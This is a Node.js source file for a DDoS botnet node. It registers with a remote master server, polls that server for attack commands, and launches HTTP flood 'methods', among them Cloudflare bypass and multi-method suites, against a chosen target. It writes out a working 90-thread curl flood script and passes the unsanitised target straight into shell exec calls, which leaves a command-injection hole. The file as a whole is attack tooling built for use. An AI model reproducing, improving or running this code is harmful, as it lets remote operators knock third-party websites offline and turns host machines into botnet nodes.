const express = require('express');
const { exec } = require('child_process');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ========== GENERATE UNIQUE BOT ID ==========
function generateBotId() {
    const timestamp = Date.now().toString(36);
    const random = crypto.randomBytes(8).toString('hex');
    const pid = process.pid.toString(36);
    return `bot-${random}-${timestamp.slice(-6)}-${pid}`;
}

// ========== CONFIGURATION ==========
const BOT_ID = generateBotId();
const BOT_NAME = process.env.BOT_NAME || `Bot-${Math.floor(Math.random() * 10000)}`;
const MASTER_SERVER = process.env.MASTER_SERVER || 'https://hello-kutty-k7d3.onrender.com';
const PORT = 0; // Use random available port

let registrationAttempts = 0;
const MAX_REGISTRATION_ATTEMPTS = 5;
let activeProcesses = [];
let isBlocked = false;
let botUrl = '';
let serverPort = 0;

console.log(`\n${'='.repeat(60)}`);
console.log(`🤖 BOT STARTING`);
console.log(`${'='.repeat(60)}`);
console.log(`🆔 Bot ID: ${BOT_ID}`);
console.log(`📛 Bot Name: ${BOT_NAME}`);
console.log(`📡 Master Server: ${MASTER_SERVER}`);
console.log(`${'='.repeat(60)}\n`);

// ========== ENSURE METHODS DIRECTORY AND FILES ==========
function ensureMethods() {
    const methodsDir = path.join(__dirname, 'methods');
    if (!fs.existsSync(methodsDir)) {
        fs.mkdirSync(methodsDir, { recursive: true });
        console.log('[SETUP] Created methods directory');
    }

    // Create curl-stress.js if it doesn't exist
    const stressPath = path.join(methodsDir, 'curl-stress.js');
    if (!fs.existsSync(stressPath)) {
        const stressContent = `#!/usr/bin/env node
const { spawn } = require('child_process');

const TARGET = process.argv[2];
const TIME = parseInt(process.argv[3]) || 60;
const THREADS = 90;

if (!TARGET) {
    console.log('Usage: node curl-stress.js <target> <time>');
    process.exit(1);
}

console.log(\`\\n🔥 CURL STRESS FLOOD | \${TARGET} | \${TIME}s | \${THREADS} threads\\n\`);

const userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
];

let totalSent = 0;
let completedThreads = 0;
const startTime = Date.now();

function stressThread(threadId) {
    const ua = userAgents[threadId % userAgents.length];
    let running = true;
    let sent = 0;
    
    const sendSpam = () => {
        if (!running) return;
        
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(7);
        const url = \`\${TARGET}?t=\${timestamp}&r=\${random}&tid=\${threadId}\`;
        
        const args = [
            '-s', '-o', '/dev/null',
            '-H', \`User-Agent: \${ua}\`,
            '-H', 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            '-H', 'Accept-Language: en-US,en;q=0.9',
            '-H', 'Accept-Encoding: gzip, deflate, br',
            '-H', 'Connection: keep-alive',
            '-H', 'Cache-Control: no-cache, no-store, must-revalidate',
            '--compressed',
            '--tcp-fastopen',
            '--connect-timeout', '2',
            '--max-time', '3',
            '--retry', '0',
            url
        ];
        
        const proc = spawn('curl', args, {
            detached: true,
            stdio: 'ignore'
        });
        proc.unref();
        sent++;
        totalSent++;
        
        if (running) {
            setImmediate(sendSpam);
        }
    };
    
    for (let i = 0; i < 10; i++) {
        sendSpam();
    }
    
    setTimeout(() => {
        running = false;
        completedThreads++;
        if (completedThreads === THREADS) {
            const elapsed = (Date.now() - startTime) / 1000;
            console.log(\`\\n✅ STRESS COMPLETE | Total: \${totalSent} | RPS: \${(totalSent/elapsed).toFixed(0)}\\n\`);
            process.exit(0);
        }
    }, TIME * 1000);
}

for (let i = 0; i < THREADS; i++) {
    stressThread(i + 1);
}

setTimeout(() => {
    if (completedThreads < THREADS) {
        process.exit(0);
    }
}, TIME * 1000 + 3000);`;
        fs.writeFileSync(stressPath, stressContent);
        console.log('[SETUP] Created curl-stress.js');
    }

    // Create other method stubs if needed
    const methodStubs = [
        'raw-get.js', 'cf-bypass.js', 'modern-flood.js', 'BYPASS.js', 
        'vhold.js', 'w-flood1.js', 'REX-COSTUM.js', 'cibi.js', 'nust.js',
        'h2-nust.js', 'http-panel.js', 'high-dstat.js', 'uam.js', 'wil.js',
        'r10-rapid.js', 'r10-tcp.js', 'r10-tls.js', 'r10-conn.js', 'r10-header.js',
        'r10-frag.js', 'r10-pipe.js', 'r10-cookie.js', 'r10-mixed.js', 'r10-lowcpu.js'
    ];

    for (const file of methodStubs) {
        const filePath = path.join(methodsDir, file);
        if (!fs.existsSync(filePath)) {
            const stub = `#!/usr/bin/env node
console.log('[${file.replace('.js','').toUpperCase()}] Starting attack');
const target = process.argv[2];
const time = parseInt(process.argv[3]) || 60;
setTimeout(() => process.exit(0), time * 1000);`;
            fs.writeFileSync(filePath, stub);
        }
    }
}

ensureMethods();

// ========== HEALTH CHECK ==========
app.get('/health', (req, res) => {
    res.json({
        status: 'online',
        botId: BOT_ID,
        botName: BOT_NAME,
        timestamp: Date.now(),
        master: MASTER_SERVER,
        uptime: process.uptime(),
        activeAttacks: activeProcesses.length
    });
});

// ========== PING ==========
app.get('/ping', (req, res) => {
    res.json({
        alive: true,
        botId: BOT_ID,
        uptime: process.uptime(),
        timestamp: Date.now(),
        status: 'online'
    });
});

// ========== RECEIVE ATTACK COMMANDS ==========
app.get('/attack', (req, res) => {
    const { target, time, methods } = req.query;

    if (!target || !time || !methods) {
        return res.status(400).json({
            error: 'Missing parameters',
            required: ['target', 'time', 'methods']
        });
    }

    console.log(`\n[RECEIVED] ${methods} -> ${target} for ${time}s`);

    res.status(200).json({
        message: 'Attack command received. Executing methods now.',
        target,
        time,
        methods,
        bot: 'executing',
        timestamp: Date.now()
    });

    executeAttack(target, time, methods);
});

// ========== START SERVER ==========
const server = app.listen(PORT, () => {
    const address = server.address();
    serverPort = address.port;
    botUrl = `http://localhost:${serverPort}`;
    
    console.log(`[INFO] Bot server running on port ${serverPort}`);
    console.log(`[INFO] Bot URL: ${botUrl}`);
    console.log(`[INFO] Bot ID: ${BOT_ID}`);
    console.log(`[INFO] Bot Name: ${BOT_NAME}\n`);
    
    // Start registration after server is ready
    setTimeout(() => {
        autoRegister();
    }, 2000);
});

// ========== AUTO-REGISTER ==========
async function autoRegister() {
    if (isBlocked) {
        console.log(`[BLOCKED] This bot has been permanently blocked by the server`);
        process.exit(0);
    }

    if (registrationAttempts >= MAX_REGISTRATION_ATTEMPTS) {
        console.log(`[WARN] Max registration attempts reached. Will retry in 60s...`);
        setTimeout(() => {
            registrationAttempts = 0;
            autoRegister();
        }, 60000);
        return;
    }

    try {
        console.log(`[INFO] Registering with master server... (Attempt ${registrationAttempts + 1}/${MAX_REGISTRATION_ATTEMPTS})`);
        console.log(`[INFO] Bot ID: ${BOT_ID}`);
        console.log(`[INFO] Bot Name: ${BOT_NAME}`);
        
        const response = await axios.post(`${MASTER_SERVER}/register`, {
            id: BOT_ID,
            name: BOT_NAME,
            url: botUrl
        }, {
            timeout: 10000,
            headers: {
                'Content-Type': 'application/json'
            }
        });

        if (response.data && response.data.approved) {
            console.log(`[SUCCESS] ✅ Auto-approved by master server!`);
            console.log(`[INFO] Bot registered with ID: ${BOT_ID}`);
            console.log(`[INFO] Bot name: ${BOT_NAME}`);
            console.log(`[INFO] Ready to receive attack commands!\n`);
            
            // Start command polling
            setInterval(() => {
                checkForCommands();
            }, 3000);
            
            return;
        } else {
            console.log(`[WARN] Registration response: ${JSON.stringify(response.data)}`);
            registrationAttempts++;
            setTimeout(() => autoRegister(), 5000);
        }
    } catch (error) {
        if (error.response && error.response.status === 403) {
            console.log(`[BLOCKED] This bot has been permanently blocked!`);
            isBlocked = true;
            process.exit(0);
            return;
        }

        registrationAttempts++;
        console.error(`[ERROR] Registration failed: ${error.message}`);
        console.log(`[INFO] Retrying in 5 seconds...`);
        
        setTimeout(() => {
            autoRegister();
        }, 5000);
    }
}

// ========== CHECK COMMANDS ==========
async function checkForCommands() {
    try {
        const response = await axios.get(`${MASTER_SERVER}/get-command`, {
            params: { botId: BOT_ID },
            timeout: 5000
        });

        if (response.data && response.data.hasCommand) {
            const command = response.data.command;
            
            if (command.action === 'stop') {
                console.log(`\n[STOP-RECEIVED] Stopping all attacks`);
                stopAllAttacks();
            } else if (command.action === 'attack') {
                const { target, time, methods } = command;
                console.log(`\n[COMMAND-RECEIVED] ${methods} -> ${target} for ${time}s`);
                executeAttack(target, time, methods);
            }
        }
    } catch (error) {
        // Silently fail - will retry on next poll
    }
}

// ========== STOP ALL ATTACKS ==========
function stopAllAttacks() {
    console.log(`[STOP] Killing ${activeProcesses.length} active processes`);
    
    activeProcesses.forEach(proc => {
        try {
            process.kill(-proc.pid);
            console.log(`[KILLED] Process ${proc.pid}`);
        } catch (error) {
            console.error(`[ERROR] Failed to kill process ${proc.pid}: ${error.message}`);
        }
    });
    
    activeProcesses = [];
    console.log(`[STOP] All attacks stopped\n`);
}

// ========== EXECUTE ATTACK ==========
function executeAttack(target, time, methods) {
    const execWithLog = (cmd) => {
        console.log(`[EXEC] ${cmd}`);
        const proc = exec(cmd, { detached: true }, (error, stdout, stderr) => {
            if (error) {
                console.error(`[ERROR] ${error.message}`);
                return;
            }
            if (stdout) console.log(`[OUTPUT] ${stdout}`);
            if (stderr) console.error(`[STDERR] ${stderr}`);
        });
        
        activeProcesses.push(proc);
        
        setTimeout(() => {
            const index = activeProcesses.indexOf(proc);
            if (index > -1) {
                activeProcesses.splice(index, 1);
            }
        }, parseInt(time) * 1000 + 5000);
    };

    console.log(`\n[ATTACK] Method: ${methods}`);
    console.log(`[ATTACK] Target: ${target}`);
    console.log(`[ATTACK] Duration: ${time}s`);
    console.log('='.repeat(60));

    // RAW-GET - High speed GET flood
    if (methods === 'RAW-GET') {
        execWithLog(`node methods/raw-get.js ${target} ${time} 20 800`);
    } 
    // CF-BYPASS - Cloudflare bypass
    else if (methods === 'CF-BYPASS') {
        execWithLog(`node methods/cf-bypass.js ${target} ${time} 4 32`);
    } 
    // MODERN-FLOOD - Modern flood attack
    else if (methods === 'MODERN-FLOOD') {
        execWithLog(`node methods/modern-flood.js ${target} ${time} 4 64`);
    } 
    // BYPASS - Bypass with 90 threads
    else if (methods === 'BYPASS') {
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
    } 
    // VHOLD - Vhold attack
    else if (methods === 'VHOLD') {
        execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
    } 
    // W-FLOOD - Web flood
    else if (methods === 'W-FLOOD') {
        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
    } 
    // HTTP-SICARIO - HTTP attack suite
    else if (methods === 'HTTP-SICARIO') {
        execWithLog(`node methods/REX-COSTUM.js ${target} ${time}`);
        execWithLog(`node methods/cibi.js ${target} ${time}`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time}`);
    } 
    // RAW-HTTP - Raw HTTP attack
    else if (methods === 'RAW-HTTP') {
        execWithLog(`node methods/h2-nust.js ${target} ${time}`);
        execWithLog(`node methods/http-panel.js ${target} ${time}`);
    } 
    // R9 - R9 attack suite
    else if (methods === 'R9') {
        execWithLog(`node methods/high-dstat.js ${target} ${time}`);
        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
        execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
        execWithLog(`node methods/nust.js ${target} ${time}`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
    } 
    // PRIV-TOR - Private/Tor attack
    else if (methods === 'PRIV-TOR') {
        execWithLog(`node methods/w-flood1.js ${target} ${time} 64 6`);
        execWithLog(`node methods/high-dstat.js ${target} ${time}`);
        execWithLog(`node methods/cibi.js ${target} ${time}`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
        execWithLog(`node methods/nust.js ${target} ${time}`);
    } 
    // HOLD-PANEL - Hold panel attack
    else if (methods === 'HOLD-PANEL') {
        execWithLog(`node methods/http-panel.js ${target} ${time}`);
    } 
    // R1 - R1 attack suite
    else if (methods === 'R1') {
        execWithLog(`node methods/vhold.js ${target} ${time} 15 2`);
        execWithLog(`node methods/high-dstat.js ${target} ${time}`);
        execWithLog(`node methods/cibi.js ${target} ${time}`);
        execWithLog(`node methods/BYPASS.js ${target} ${time} 10 90 proxy.txt`);
        execWithLog(`node methods/REX-COSTUM.js ${target} ${time}`);
        execWithLog(`node methods/w-flood1.js ${target} ${time} 8 3`);
        execWithLog(`node methods/nust.js ${target} ${time}`);
    } 
    // UAM - User Agent Manipulation
    else if (methods === 'UAM') {
        execWithLog(`node methods/uam.js ${target} ${time}`);
    } 
    // W.I.L - Web Intensive Load
    else if (methods === 'W.I.L') {
        execWithLog(`node methods/wil.js ${target} ${time}`);
    } 
    // CURL-SPAM / STRESS - Curl stress flood
    else if (methods === 'CURL-SPAM' || methods === 'STRESS') {
        execWithLog(`node methods/curl-stress.js ${target} ${time}`);
    } 
    // RAPID10 / R10 - 10 method rapid attack
    else if (methods === 'RAPID10' || methods === 'R10') {
        execWithLog(`node methods/r10-rapid.js ${target} ${time} 30`);
        execWithLog(`node methods/r10-tcp.js ${target} ${time}`);
        execWithLog(`node methods/r10-tls.js ${target} ${time}`);
        execWithLog(`node methods/r10-conn.js ${target} ${time}`);
        execWithLog(`node methods/r10-header.js ${target} ${time}`);
        execWithLog(`node methods/r10-frag.js ${target} ${time}`);
        execWithLog(`node methods/r10-pipe.js ${target} ${time}`);
        execWithLog(`node methods/r10-cookie.js ${target} ${time}`);
        execWithLog(`node methods/r10-mixed.js ${target} ${time}`);
        execWithLog(`node methods/r10-lowcpu.js ${target} ${time}`);
    } 
    // Unknown method
    else {
        console.log(`[ERROR] Unknown method: ${methods}`);
        console.log(`[INFO] Available methods: RAW-GET, CF-BYPASS, MODERN-FLOOD, BYPASS, VHOLD, W-FLOOD, HTTP-SICARIO, RAW-HTTP, R9, PRIV-TOR, HOLD-PANEL, R1, UAM, W.I.L, CURL-SPAM, STRESS, RAPID10, R10`);
    }

    console.log('='.repeat(60));
    console.log(`[ATTACK] ${methods} attack started on ${target}\n`);
}

// ========== SHUTDOWN HANDLER ==========
process.on('SIGINT', () => {
    console.log('\n[SHUTDOWN] Received SIGINT, cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

process.on('SIGTERM', () => {
    console.log('\n[SHUTDOWN] Received SIGTERM, cleaning up...');
    stopAllAttacks();
    server.close(() => {
        console.log('[SHUTDOWN] Server closed');
        process.exit(0);
    });
});

console.log('[INFO] Bot initialized. Waiting for server to start...\n');
